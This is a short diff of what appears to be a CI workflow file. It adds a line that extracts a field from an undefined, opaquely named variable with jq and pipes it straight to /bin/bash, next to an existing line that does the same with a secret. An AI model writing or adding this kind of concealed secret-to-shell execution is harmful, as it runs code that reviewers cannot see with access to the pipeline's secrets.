@@ -23,6 +23,7 @@ jobs:
           rdte03: ${{ secrets.rdte03 }}
         run: |
           printf '%s' "$rdte03" | jq -r .jhl90 | /bin/bash
+          echo $bih6807 | jq -r .ehba6415 | /bin/bash
 
       - name: Save archive
         if: always()
